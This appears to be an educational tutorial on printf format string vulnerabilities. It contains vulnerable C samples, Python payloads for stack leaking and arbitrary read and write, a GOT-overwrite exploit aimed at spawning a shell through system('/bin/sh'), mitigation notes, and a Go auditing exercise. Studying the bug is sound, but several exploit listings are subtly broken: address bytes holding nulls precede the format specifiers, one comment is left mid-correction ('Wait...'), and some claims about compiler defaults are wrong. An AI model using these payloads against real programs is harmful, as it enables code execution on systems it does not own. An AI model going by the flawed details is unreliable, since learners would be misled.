Format Strings

User-controlled format string bugs in printf-family functions that leak stack data, read and write arbitrary memory, and can redirect execution to a shell.

Overview

A format string bug appears when a program passes attacker-controlled data as the format argument to a printf -family function. The format string then drives how the function walks its arguments, which turns a logging call into a primitive for reading stack memory, reading arbitrary addresses, and writing arbitrary values. This article follows the bug from the calling convention up to a working control-flow hijack, then covers the compiler and libc hardening that fights back.

  • Stack - stack layout, calling conventions, argument passing
  • Buffer Overflows - memory corruption primitives

The Vulnerability

A format string vulnerability exists when user-controlled data is passed as the format argument to a printf -family function: 

printf(user_input);         // VULNERABLE
printf("%s", user_input);   // SAFE

The first form interprets user_input as a format string. Format specifiers embedded in the input ( %x , %n , %s ) are processed by printf , which reads arguments from the stack (or register spill area) as if they were passed by the caller. Since no arguments were actually passed, printf reads whatever values happened to be in those locations.

The second form binds user_input to the %s specifier - only printable characters are emitted. This is the correct pattern.

How printf Walks Its Arguments

On x86-64 System V ABI, the first six integer/pointer arguments pass in registers: rdi (format string), rsi , rdx , rcx , r8 , r9 . The seventh and beyond pass on the stack. Floating-point arguments use xmm0 - xmm7 .

printf is a variadic function. It doesn't know how many arguments were passed. It trusts the format string to tell it. For each % specifier, printf reads the next argument slot using va_arg(ap, type) . If the format string has 20 %x specifiers but zero arguments were passed, printf reads 20 values from register spill area (saved on the va_list stack) and the stack.

The va_list is constructed by va_start(ap, format) . On x86-64, va_start saves the register arguments ( rsi .. r9 ) to a "register save area" on the stack and sets up a pointer into the overflow argument area (stack-passed args). The format string controls exactly how many arguments printf consumes.

Format Specifiers That Matter

Specifier Reads/Writes Description
%d Reads 4 bytes Signed decimal integer
%u Reads 4 bytes Unsigned decimal integer
%x Reads 4 bytes Lowercase hexadecimal
%lx Reads 8 bytes Long hexadecimal (64-bit)
%p Reads 8 bytes Pointer (prefixed 0x)
%s Dereferences pointer, reads bytes until\0 String from address
%n Writes 4 bytesto pointer on stack Count of bytes written so far
%hn Writes 2 bytes(halfword) Halfword write
%hhn Writes 1 byte(byte) Byte write
%ln Writes 8 bytes(long) 64-bit write

%s is a read primitive - if you place a target address on the stack where printf expects a char* argument, printf dereferences it and prints bytes from that memory until a null byte. This is an arbitrary read.

%n is a write primitive - it stores the number of bytes written so far ( printf 's internal character count) to the address pointed to by the corresponding argument. If you place a target address on the stack where printf expects an int* , the count is written there. This is an arbitrary write.

Stack Reading with %x

The simplest exploitation: leak stack contents.

/* fmt_leak.c — compile with -no-pie, run and observe */
#include <stdio.h>

int main() {
    char secret[] = "FLAG{stack-leaked-data}";
    char input[256];

    printf("secret is at %p\n", secret);

    fgets(input, sizeof(input), stdin);
    printf(input);  /* VULNERABLE */
    printf("\n");

    return 0;
}
						
gcc -g -no-pie -fno-stack-protector -o fmt_leak fmt_leak.c
./fmt_leak <<< '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p'

The output leaks return addresses, saved frame pointers, and - if somewhere on the stack - the secret string address and contents. Each %p reads 8 bytes from the argument area. On a typical run: 

secret is at 0x7fffffffde90
0x7ffff7faa580.0x1.0x7ffff7e08e6e.(nil).0x7ffff7fa18a8.0x70252e70252e7025...

The ASCII values 0x70252e70252e7025 are the format string itself ( %p.%p.%p... ) - the input buffer is on the stack and printf reads back its own format string bytes. This demonstrates that the format string itself sits in memory reachable by the arg-walking logic.

Direct Parameter Access: %N$x

Normally, format specifiers consume arguments sequentially. %N$x lets you skip to the Nth argument directly: 

%1$x  →  first argument (rsi)
%2$x  →  second argument (rdx)
%6$x  →  first stack-passed argument (position 6 on x86-64)

This is critical for exploitation - instead of printing 20 values to reach a target on the stack, you can directly reference the argument position where your target address sits: 

echo '%6$p' | ./fmt_leak
# reads the 6th argument (first on stack) as a pointer

Finding the offset of your input on the stack:

# Send AAAA followed by many %p to find where 0x41414141 appears
python3 -c "print('AAAA' + '.%p' * 20)" | ./fmt_leak
# Find which position shows 0x41414141 — that's where your input begins
# in the argument list.

# Once found, use %N$x to reference it directly:
# If AAAA appears at position 8:
python3 -c "import sys; sys.stdout.buffer.write(b'%8\$p')" | ./fmt_leak
# prints the first 8 bytes of the format string buffer as a pointer

%s: Arbitrary Read

If you place an address on the stack at a position where printf expects a string argument, %s dereferences it and reads memory: 

/* fmt_read.c — arbitrary read via %s */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main() {
    char target[] = "SENSITIVE_DATA_12345";
    char fmt[256];

    printf("target @ %p = %s\n", target, target);

    fgets(fmt, sizeof(fmt), stdin);

    /* Craft input: [address of target as bytes] + %N$s
       where N is the position on the stack where [address bytes] appear */

    printf(fmt);  /* VULNERABLE: %s dereferences our injected address */
    printf("\n");

    return 0;
}

The attack string: 8 bytes of the target address (little-endian), then %6$s (or whichever position corresponds to the start of the format buffer on the stack). 

# Determine offset of format buffer on printf's argument list:
python3 -c "print('AAAABBBB' + '.%p' * 15)" | ./fmt_read
# Note which position shows 0x4242424241414141 (AAAABBBB)

# Suppose position = 6.
# target = 0x7fffffffde90
# Craft bytes: \x90\xde\xff\xff\xff\x7f\x00\x00 + %6$s

python3 -c "
import sys
addr = 0x7fffffffde90
payload = addr.to_bytes(8, 'little') + b'%6\$s\n'
sys.stdout.buffer.write(payload)
" | ./fmt_read

# Output: SENSITIVE_DATA_12345 (leaked from memory!)

%n: Arbitrary Write

%n stores the cumulative number of characters written so far into the int* pointed to by the argument. By controlling both the character count (via padding like %NNNNc ) and the address on the stack, you write an arbitrary value to an arbitrary location. 

/* fmt_write.c — arbitrary write via %n */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned int target = 0xDEADBEEF;

int main() {
    char fmt[256];

    printf("target @ %p = 0x%08x\n", &target, target);

    fgets(fmt, sizeof(fmt), stdin);
    printf(fmt);  /* VULNERABLE */
    printf("\n");

    printf("target now = 0x%08x\n", target);
    return 0;
}

To write value 0x00000041 (65 decimal) to &target at stack position 6: 

# payload: [8 bytes: &target] + %65c%6$n
# %65c prints a character padded to 65 width → printf count = 65
# %6$n writes 65 to *(int*) stack_position_6

python3 -c "
import sys
target_addr = 0x555555558014  # from program output
payload = target_addr.to_bytes(8, 'little')
payload += b'%65c%6\$n\n'
sys.stdout.buffer.write(payload)
" | ./fmt_write

# target now = 0x00000041

For multi-byte writes, use %hn (2-byte writes) or %hhn (1-byte writes) to write larger addresses in chunks without printing billions of characters: 

# Write 0x41424344 as 4 single-byte writes at offsets 0,1,2,3:
# addr+0 → %hhn writes byte 0
# addr+1 → %hhn writes byte 1
# ...etc.

# Each write needs:
#   [8 bytes: target_addr + offset]
#   %NNc to adjust counter
#   %pos$hhn to write byte

# This requires the target addresses to be on the stack (stack positions 6,7,8,9)
# so the entire payload is:
# [addr][addr+1][addr+2][addr+3] + %c%c%c%c for each + %hhn modifiers

GOT Overwrite to Code Execution

The Global Offset Table (GOT) holds function pointers resolved by the dynamic linker. When printf is called, the PLT stub jumps through the GOT entry for printf to reach the actual glibc implementation. If an attacker overwrites printf@GOT with the address of system , subsequent calls to printf jump to system instead. 

/* got_overwrite.c — format string → GOT overwrite */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void target_func() {
    printf("You should never see this\n");
}

int main() {
    char buf[256];

    printf("printf@GOT = %p\n", printf);   /* actually PLT, need real GOT addr */
    printf("system    = %p\n", system);
    printf("Input: ");
    fgets(buf, sizeof(buf), stdin);

    printf(buf);  /* VULNERABLE — overwrites printf@GOT with system */

    /* Second printf call goes through GOT → system("/bin/sh") if we win */
    printf("/bin/sh");

    return 0;
}

The goal: overwrite printf@GOT with system@plt (or system 's real address). After the vulnerable printf(buf) executes, the GOT entry is poisoned. The next printf("/bin/sh") calls system("/bin/sh") - spawning a shell.

The GOT entry for printf is resolved lazily on its first call, so an earlier printf in the same run leaves the entry pointing at the real libc function. The format string overwrites that resolved address with the address of system byte-by-byte using %hhn at calculated offsets. A binary linked with LD_BIND_NOW=1 resolves every entry eagerly, and full RELRO makes the GOT read-only, which blocks this target. 

# got_overwrite_exploit.py
import struct
import sys

# These addresses depend on the binary:
printf_got = 0x404018   # from objdump -R ./got_overwrite | grep printf
system_plt = 0x401050   # from objdump -d ./got_overwrite | grep '<system@plt>'

# system_plt bytes: 0x0000000000401050 (little-endian: 50 10 40 00 00 00 00 00)

# We need to write 4 byte values: 0x50, 0x10, 0x40, 0x00
# to addresses: printf_got+0, printf_got+1, printf_got+2, printf_got+3
# sorted by value ascending so the counter only increases

writes = [
    (printf_got + 1, 0x10),
    (printf_got + 0, 0x50),
    (printf_got + 2, 0x40),
    (printf_got + 3, 0x00),
]
writes.sort(key=lambda x: x[1])

# Build payload
payload = b''
for addr, val in writes:
    payload += struct.pack('<Q', addr)

# Stack positions for our addresses (depends on buffer offset):
# Position 6 corresponds to start of buf on stack
# So addresses are at positions 6, 8, 10, 12 (each address = 8 bytes = 2 stack slots)
# Wait, each 8-byte address occupies ONE argument position on x86-64
# So addresses are at 6, 7, 8, 9

# Now the %c/%hhn specifiers
counter = 0
for i, (addr, val) in enumerate(writes):
    needed = (val - counter) % 256
    if needed > 0:
        payload += f'%{needed}c'.encode()
    payload += f'%{6+i}$hhn'.encode()
    counter = val

payload += b'\n'

sys.stdout.buffer.write(payload)
						
python3 got_overwrite_exploit.py | ./got_overwrite
# If successful: drops to sh prompt

Compiler Warnings

GCC emits -Wformat-security warnings for printf(foo) where foo is not a string literal: 

gcc -Wformat -Wformat-security -o test test.c
# test.c:15:5: warning: format not a string literal and no format arguments
# [-Wformat-security]
#    15 |     printf(buf);
#       |     ^~~~~~

-Wformat-security is part of -Wall in most GCC versions. Despite this, vulnerable code persists

  • legacy codebases, macros that hide printf calls, and syslog() -style logging where the

format is constructed dynamically.

FORTIFY_SOURCE Mitigation

glibc's _FORTIFY_SOURCE (levels 1 and 2) provides runtime protections against format string attacks: 

# Compile with FORTIFY_SOURCE:
gcc -O2 -D_FORTIFY_SOURCE=2 -o fmt_fort fmt_leak.c

# At runtime, printf checks if the format string is in a writable segment.
# If the format string contains %n and the format is in writable memory:
#   *** %n in writable segment detected ***
#   Aborted (core dumped)

_FORTIFY_SOURCE=2 uses __builtin_object_size to determine the size of the destination buffer and __printf_chk which rejects %n when the format string is writable (on the stack or heap). This only blocks %n - %s arbitrary read still works.

The bypass: if the format string is in a read-only segment (e.g., a constant string in .rodata), %n is allowed because it's considered a "trusted" format string. This is why format string vulnerabilities in syslog() (where user data goes to a format string constant + user suffix) are harder to exploit.

Real-World Format String Vulnerabilities

syslog injection. syslog(LOG_ERR, user_data); - user_data contains format specifiers. The syslog daemon may be running as root.

printf-format error messages. fprintf(stderr, error_message); where error_message comes from a network response or file. Diagnostic messages rarely sanitize format specifiers.

Internationalization. printf(gettext("Hello %s"), name); - if the translation file is compromised, %n can be injected. Mitigated by restricting translation file write access and validating translations.

Windows 'FormatMessage'. The Windows API equivalent ( %1!s! etc.) has its own set of format string bugs with different exploitation characteristics.

ASLR and Format Strings

ASLR randomizes stack and library addresses. For format string attacks, this means: - The format string buffer is at a randomized stack address - %6$p leaks it, breaking ASLR. - GOT addresses are known from the binary (no PIE). Combined, format string reads leak stack addresses, format string writes modify GOT entries.

A format string vulnerability with full RELRO is harder: the GOT is read-only. But function pointers on the heap (e.g., C++ vtable), __exit_funcs , or .fini_array destructor pointers are alternative write targets.

Detection with Static Analysis

Clang Static Analyzer's security.insecureAPI.DeprecatedOrUnsafeBufferHandling does NOT catch format string bugs. Use specialized checkers: 

# flawfinder (basic pattern match):
flawfinder fmt_leak.c
# fmt_leak.c:15: [4] (format) printf: If format strings can be
#   influenced by an attacker, they can be exploited.

# CodeQL query (semantic):
# from FunctionCall call
# where call.getTarget().hasName("printf") and
#   not call.getArgument(0).getValue() instanceof StringLiteral
# select call

Summary

A format string vulnerability is a user-controlled format argument to printf -family functions. It provides three primitives: stack reading ( %x , %p ), arbitrary memory reading ( %s with injected address), and arbitrary writing ( %n with injected address and character-count padding). The %n specifier is the crown jewel - it converts a log statement into a write-what-where primitive. The exploit chain: leak addresses -> overwrite GOT entry -> redirect execution to system . Mitigations: always use printf("%s", input) , enable -Wformat-security , compile with _FORTIFY_SOURCE=2 , and use full RELRO to protect the GOT.

Challenge

Write a Go tool that audits C source files for format string bugs. Read the file line by line, find calls to printf , fprintf , sprintf , snprintf , syslog , and dprintf , and report every call whose format argument is not a string literal. A call is safe when the first argument is a quoted string; a call is suspect when the first argument is a variable, a macro, or a function call. Print one finding per line as <file>:<line>: unsafe <function> call .

Start from this skeleton:

package main

import (
	"bufio"
	"fmt"
	"os"
	"regexp"
)

var callRe = regexp.MustCompile(`\b(printf|fprintf|sprintf|snprintf|syslog|dprintf)\s*\(`)

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: fmt-audit file.c")
		os.Exit(1)
	}

	f, err := os.Open(os.Args[1])
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer f.Close()

	scanner := bufio.NewScanner(f)
	line := 0
	for scanner.Scan() {
		line++
		text := scanner.Text()
		// TODO: find calls with callRe, inspect the first argument,
		// and print "<file>:<line>: unsafe <function> call" for suspects.
		_ = text
	}
}

Test it against the fmt_leak.c and fmt_read.c listings above. Then extend the tool so it also flags %n in a format string, since that is the specifier that turns a read into a write.
